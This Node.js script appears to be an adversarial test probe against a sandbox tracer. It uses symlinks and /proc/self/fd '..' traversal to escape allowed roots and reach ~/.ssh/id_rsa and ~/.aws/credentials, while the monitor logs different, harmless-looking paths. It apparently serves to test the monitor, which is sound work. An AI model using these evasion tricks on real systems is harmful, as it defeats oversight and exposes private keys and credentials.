'use strict';
// The kernel follows a symlink or a /proc/self/fd/N magic link and THEN applies "..".
// trace.js normalize() collapses ".." lexically first, so the recorded path differs.
const fs = require('node:fs');
const log = (m) => console.log('[adv7-dotdot]', m);
const t = (n, f) => { try { const r = f(); log(`${n}: ${r === undefined ? 'done' : r}`); } catch (e) { log(`${n}: ${e.code}`); } };
const DEEP = '/usr/local/lib/node_modules/npm'; // 5 levels deep, outside the allowed roots
// rule a via a task-created symlink: kernel /usr/work/qpa (EROFS), lexical /work/qpa (allowed)
t('symlink /tmp/qa -> DEEP', () => fs.symlinkSync(DEEP, '/tmp/qa'));
t('mkdir /tmp/qa/../../../../work/qpa (a)', () => fs.mkdirSync('/tmp/qa/../../../../work/qpa'));
// rule a via /proc/self/fd/N: kernel /usr/work/qpb, lexical /work/qpb
let dfd = null;
t('open DEEP r', () => { dfd = fs.openSync(DEEP, 'r'); return dfd; });
if (dfd !== null) t('mkdir /proc/self/fd/N/../../../../work/qpb (a)', () => fs.mkdirSync(`/proc/self/fd/${dfd}/../../../../work/qpb`));
// rule b via a symlink into HOME: kernel /home/qp/.ssh/id_rsa, lexical /.ssh/id_rsa
t('mkdir /home/qp/qa/qb', () => fs.mkdirSync('/home/qp/qa/qb', { recursive: true }));
t('symlink /tmp/qb -> /home/qp/qa/qb', () => fs.symlinkSync('/home/qp/qa/qb', '/tmp/qb'));
t('read /tmp/qb/../../.ssh/id_rsa (b)', () => fs.readFileSync('/tmp/qb/../../.ssh/id_rsa', 'utf8').length);
// rule b via /proc/self/fd/N of a HOME dir: kernel /home/qp/.aws/credentials, lexical /proc/self/.aws/credentials
let hfd = null;
t('open /home/qp/qa/qb r', () => { hfd = fs.openSync('/home/qp/qa/qb', 'r'); return hfd; });
if (hfd !== null) t('exists /proc/self/fd/N/../../.aws/credentials (b)', () => fs.existsSync(`/proc/self/fd/${hfd}/../../.aws/credentials`));
